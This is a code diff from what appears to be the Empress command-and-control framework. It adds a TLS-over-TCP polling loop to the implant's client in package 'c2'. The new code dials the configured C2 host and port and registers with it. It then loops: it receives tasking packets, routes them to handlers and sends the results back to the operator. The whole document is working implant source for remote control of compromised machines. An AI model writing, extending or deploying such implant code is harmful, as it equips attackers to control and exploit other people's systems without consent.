@@ -4,11 +4,15 @@ package c2
 
 import (
 	"bytes"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/json"
 	"github.com/pygrum/Empress/config"
+	"github.com/pygrum/Empress/crypto"
 	"github.com/pygrum/Empress/transport"
 	"io"
 	"math/rand"
+	"net"
 	"net/http"
 	"time"
 )
@@ -44,6 +48,63 @@ func (c *Client) Poll() (*transport.Registration, error) {
 		}
 	}
 	return nil, nil
+}
+
+func (c *Client) PollTCP() error {
+	for {
+		if err := c.pollTCP(); err != nil {
+			return err
+		}
+	}
+}
+
+func (c *Client) pollTCP() error {
+	reg := Registration(nil)
+	data, err := marshalRegistration(reg)
+	if err != nil {
+		return err
+	}
+	caCertPool := x509.NewCertPool()
+	caCertPool.AppendCertsFromPEM(config.C.CaCertPEM)
+	tlsConfig := &tls.Config{
+		RootCAs:               caCertPool,
+		InsecureSkipVerify:    true,
+		VerifyPeerCertificate: crypto.PeerCertificateVerifier(config.C.CaCertPEM),
+	}
+	conn, err := tls.Dial("tcp", net.JoinHostPort(config.C.C2Host, config.C.C2Port), tlsConfig)
+	if err != nil {
+		return err
+	}
+	return c.handle(conn, data)
+}
+
+func (c *Client) handle(conn net.Conn, regData []byte) error {
+	if _, err := conn.Write(regData); err != nil {
+		return err
+	}
+	for {
+		packet, err := readPacket(conn)
+		if err != nil {
+			return err
+		}
+		req, err := parseRequest(packet)
+		if err != nil {
+			return err
+		}
+		strArgs := []string{}
+		for _, a := range req.Args {
+			strArgs = append(strArgs, string(a))
+		}
+
+		resp := c.router.handle(req)
+		data, err := marshalResponse(resp)
+		if err != nil {
+			return err
+		}
+		if _, err = conn.Write(data); err != nil {
+			return err
+		}
+	}
 }
 
 func (c *Client) poll() (*transport.Registration, error) {
